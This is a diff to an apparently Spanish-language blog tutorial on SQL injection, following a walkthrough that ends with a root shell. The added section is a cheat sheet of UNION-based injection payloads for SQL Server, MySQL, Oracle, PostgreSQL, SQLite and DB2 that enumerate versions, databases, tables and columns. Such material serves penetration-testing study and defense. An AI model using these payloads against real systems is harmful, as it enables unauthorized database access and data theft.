@@ -631,19 +631,109 @@ www-data@validation:/var/www/html$
 
 Con esa contraseña obtenida es posible acceder al usuario root con ```su root```.
 
-### Otros
+### Resumen (considerando 3 columnas)
 
-* Obtener versión en Oracle
+#### Consultar versión
+
+* SQL Server
     ```sql
-    ' UNION SELECT banner, NULL FROM v$version--
+    ' UNION SELECT NULL, @@VERSION, NULL-- 
     ```
-* Obtener versión en SQL Server
+* MySQL
     ```sql
-    ' UNION SELECT @@VERSION--    (1 columna)
-    ' UNION SELECT NULL, @@VERSION--    (2 columnas)
-    ' UNION SELECT NULL, @@VERSION, NULL--    (3 columnas)
+    ' UNION SELECT VERSION(), NULL--
     ```
-    > Recordar que con [ORDER BY](https://nptg24.github.io/sql-inject/#identificar-n%C3%BAmero-de-columnas) se identifica el número de columnas.
+* Oracle
+    ```sql
+    ' UNION SELECT banner, NULL FROM v$version WHERE banner LIKE 'Oracle%'--
+    ```
+* PostgeSQL
+    ```sql
+    ' UNION SELECT version(), NULL--
+    ```
+* SQLite
+    ```sql
+    ' UNION SELECT sqlite_version(), NULL--
+    ```
+* IBM DB2
+    ```sql
+    ' UNION SELECT SERVICE_LEVEL, VERSIONNUMBER FROM TABLE (sysproc.env_get_inst_info()) AS SYSTEMINFO--
+    ```
+
+#### Obtener nombre de la base de datos
+
+* SQL Server
+    ```sql
+    ' UNION SELECT name, NULL FROM master..sysdatabases--
+    ```
+* MySQL
+    ```sql
+    ' UNION SELECT schema_name, NULL FROM information_schema.schemata--
+    ```
+* Oracle
+    ```sql
+    ' UNION SELECT username, NULL FROM all_users--
+    ```
+* PostgeSQL
+    ```sql
+    ' UNION SELECT datname, NULL FROM pg_database--
+    ```
+* IBM DB2
+    ```sql
+    ' UNION SELECT schemaname, NULL FROM syscat.schemata--
+    ```
+
+#### Consultar tablas
+
+* SQL Server
+    ```sql
+    ' UNION SELECT TABLE_NAME, NULL FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_SCHEMA = DB_NAME()--
+    ```
+* MySQL
+    ```sql
+    ' UNION SELECT table_name, NULL FROM information_schema.tables WHERE table_schema = database()--
+    ```
+* Oracle
+    ```sql
+    ' UNION SELECT table_name, NULL FROM all_tables--
+    ```
+* PostgeSQL
+    ```sql
+    ' UNION SELECT tablename, NULL FROM pg_tables WHERE schemaname = current_schema()--
+    ```
+* SQLite
+    ```sql
+    ' UNION SELECT name, NULL FROM sqlite_master WHERE type='table'--
+    ```
+* IBM DB2
+    ```sql
+    ' UNION SELECT tabname, NULL FROM syscat.tables WHERE tabschema = current schema--
+    ```
+
+#### Consultar columna
+
+* SQL Server
+    ```sql
+    ' UNION SELECT COLUMN_NAME, NULL FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME = 'nombre de tabla' AND TABLE_SCHEMA = DB_NAME()--
+    ```
+* MySQL
+    ```sql
+    ' UNION SELECT column_name, NULL FROM information_schema.columns WHERE table_name = 'nombre de tabla' AND table_schema = database()--
+    ```
+* Oracle
+    ```sql
+    ' UNION SELECT column_name, NULL FROM all_tab_columns WHERE table_name = 'nombre de tabla'--
+    ```
+* PostgeSQL
+    ```sql
+    ' UNION SELECT column_name, NULL FROM information_schema.columns WHERE table_name = 'nombre de tabla' AND table_schema = current_schema()--
+    ```
+* IBM DB2
+    ```sql
+    ' UNION SELECT colname, NULL FROM syscat.columns WHERE tabname = 'nombre de tabla' AND tabschema = current schema--
+    ```
+
+> Recordar que con [ORDER BY](https://nptg24.github.io/sql-inject/#identificar-n%C3%BAmero-de-columnas) se identifica el número de columnas.
     
 ### Recomendaciones
 
